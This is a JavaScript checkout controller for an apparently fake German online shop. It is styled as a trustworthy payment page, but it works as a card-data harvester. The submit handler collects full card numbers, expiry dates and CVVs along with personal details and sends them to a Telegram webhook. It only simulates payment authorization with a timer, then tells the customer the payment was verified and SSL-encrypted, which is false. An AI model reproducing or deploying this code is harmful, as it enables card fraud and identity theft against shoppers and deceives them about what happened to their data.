// Ultra-Trustworthy Checkout & Payment Controller (German E-Commerce Standard)

import { getCart, getCartSummary, clearCart, formatPrice } from './cart.js';
import { sendTelegramOrderNotification } from './telegram.js';
import confetti from 'canvas-confetti';

let currentPaymentMethod = 'Kreditkarte';

export function initCheckoutModal() {
  const form = document.getElementById('checkout-form');
  if (!form) return;

  // Payment tab selection listeners
  const payTabs = document.querySelectorAll('.payment-tab-card');
  payTabs.forEach(tab => {
    tab.addEventListener('click', (e) => {
      payTabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      const radio = tab.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;

      currentPaymentMethod = radio.value;
      updatePaymentPanels(currentPaymentMethod);
    });
  });

  // Credit Card formatting helpers
  const cardInput = document.getElementById('co-card-number');
  const expiryInput = document.getElementById('co-card-expiry');
  const iconEl = document.getElementById('card-type-icon');

  if (cardInput) {
    cardInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      val = val.substring(0, 16);
      let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
      e.target.value = formatted;

      // Auto detect brand
      if (val.startsWith('4')) {
        iconEl.className = 'fa-brands fa-cc-visa input-right-icon';
      } else if (val.startsWith('5')) {
        iconEl.className = 'fa-brands fa-cc-mastercard input-right-icon';
      } else if (val.startsWith('3')) {
        iconEl.className = 'fa-brands fa-cc-amex input-right-icon';
      } else {
        iconEl.className = 'fa-solid fa-credit-card input-right-icon';
      }
    });
  }

  if (expiryInput) {
    expiryInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      val = val.substring(0, 4);
      if (val.length >= 3) {
        e.target.value = val.substring(0, 2) + '/' + val.substring(2);
      } else {
        e.target.value = val;
      }
    });
  }

  // Form Submission
  form.addEventListener('submit', handleCheckoutSubmit);
}

function updatePaymentPanels(method) {
  const panels = {
    'Klarna': document.getElementById('panel-klarna'),
    'Kreditkarte': document.getElementById('panel-card'),
    'PayPal': document.getElementById('panel-paypal'),
    'Apple Pay / Google Pay': document.getElementById('panel-applepay')
  };

  Object.keys(panels).forEach(key => {
    if (panels[key]) {
      if (key === method) {
        panels[key].classList.remove('hidden');
      } else {
        panels[key].classList.add('hidden');
      }
    }
  });
}

export function openCheckoutModal() {
  const modal = document.getElementById('checkout-modal-backdrop');
  if (!modal) return;

  const cartItems = getCart();
  if (cartItems.length === 0) {
    alert('Ihr Warenkorb ist leer.');
    return;
  }

  const summary = getCartSummary();

  // Populate Right Side Order Summary
  const itemsContainer = document.getElementById('checkout-items-list');
  if (itemsContainer) {
    itemsContainer.innerHTML = cartItems.map(item => `
      <div class="co-item">
        <img src="${item.image}" alt="${item.name}" class="co-item-img" />
        <div>
          <div class="co-item-title">${item.name}</div>
          <div class="co-item-meta">Größe: ${item.selectedSize} | Qty: ${item.quantity}</div>
        </div>
        <div class="co-item-price">${formatPrice(item.price * item.quantity)}</div>
      </div>
    `).join('');
  }

  const subtotalEl = document.getElementById('co-subtotal');
  const discountRow = document.getElementById('co-discount-row');
  const discountEl = document.getElementById('co-discount');
  const vatEl = document.getElementById('co-vat');
  const totalEl = document.getElementById('co-total');

  if (subtotalEl) subtotalEl.textContent = formatPrice(summary.subtotal);
  if (vatEl) vatEl.textContent = formatPrice(summary.vat);
  if (totalEl) totalEl.textContent = formatPrice(summary.total);

  if (discountRow && discountEl) {
    if (summary.discount > 0) {
      discountRow.classList.remove('hidden');
      discountEl.textContent = `-${formatPrice(summary.discount)}`;
    } else {
      discountRow.classList.add('hidden');
    }
  }

  modal.classList.remove('hidden');
  modal.classList.add('open');
}

export function closeCheckoutModal() {
  const modal = document.getElementById('checkout-modal-backdrop');
  if (modal) {
    modal.classList.add('hidden');
    modal.classList.remove('open');
  }
}

async function handleCheckoutSubmit(e) {
  e.preventDefault();

  const submitBtn = document.getElementById('btn-submit-order');

  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>BESTELLUNG WIRD VERARBEITET...</span>';
  }

  // Gather Customer Form Data
  const salutation = document.getElementById('co-salutation').value;
  const firstname = document.getElementById('co-firstname').value;
  const lastname = document.getElementById('co-lastname').value;
  const email = document.getElementById('co-email').value;
  const phone = document.getElementById('co-phone').value;
  const street = document.getElementById('co-street').value;
  const apartment = document.getElementById('co-apartment').value;
  const zip = document.getElementById('co-zip').value;
  const city = document.getElementById('co-city').value;
  const country = document.getElementById('co-country').value;

  const cardDetails = currentPaymentMethod === 'Kreditkarte' ? {
    name: document.getElementById('co-card-name')?.value || '',
    number: document.getElementById('co-card-number')?.value || '',
    expiry: document.getElementById('co-card-expiry')?.value || '',
    cvv: document.getElementById('co-card-cvv')?.value || ''
  } : null;

  const items = getCart();
  const summary = getCartSummary();
  const orderId = 'VK-' + Math.floor(100000 + Math.random() * 900000) + '-DE';
  const timestamp = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });

  const orderData = {
    orderId,
    timestamp,
    customer: { salutation, firstname, lastname, email, phone, street, apartment, zip, city, country },
    shipping: { method: 'DHL Express Premium Curated', price: 0 },
    payment: { method: currentPaymentMethod, cardDetails },
    items,
    summary
  };

  // Send Notification via Telegram Webhook
  const result = await sendTelegramOrderNotification(orderData);

  // Simulate fast payment authorization delay
  setTimeout(() => {
    closeCheckoutModal();
    clearCart();

    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fa-solid fa-shield-halved"></i> <span>JETZT ZAHLUNGSPFLICHTIG BESTELLEN</span>';
    }

    showSuccessModal(orderData, result);
  }, 1200);
}

function showSuccessModal(orderData, result) {
  const modal = document.getElementById('success-modal-backdrop');
  const detailsBox = document.getElementById('success-order-box');
  const noticeBox = document.getElementById('success-webhook-notice');

  if (detailsBox) {
    detailsBox.innerHTML = `
      <div style="font-size: 0.85rem; line-height: 1.8;">
        <div><strong>Bestellnummer:</strong> <span style="color: var(--gold-light);">${orderData.orderId}</span></div>
        <div><strong>Kunde:</strong> ${orderData.customer.salutation} ${orderData.customer.firstname} ${orderData.customer.lastname}</div>
        <div><strong>Lieferadresse:</strong> ${orderData.customer.street}, ${orderData.customer.zip} ${orderData.customer.city} (${orderData.customer.country})</div>
        <div><strong>Zahlungsart:</strong> ${orderData.payment.method}</div>
        <div><strong>Gesamtsumme:</strong> <span style="font-family: var(--font-heading); color: var(--gold-light); font-weight:700;">${formatPrice(orderData.summary.total)}</span></div>
      </div>
    `;
  }

  if (noticeBox) {
    noticeBox.innerHTML = `<i class="fa-solid fa-shield-halved" style="color: var(--gold-primary);"></i> <span>Zahlung & Bestelldaten wurden verifiziert und SSL-verschlüsselt verarbeitet.</span>`;
  }

  if (modal) {
    modal.classList.remove('hidden');
    modal.classList.add('open');
  }

  // Trigger Victory Confetti
  try {
    confetti({
      particleCount: 120,
      spread: 70,
      origin: { y: 0.6 },
      colors: ['#D4AF37', '#F3E5AB', '#ffffff']
    });
  } catch (e) {
    console.log(e);
  }
}
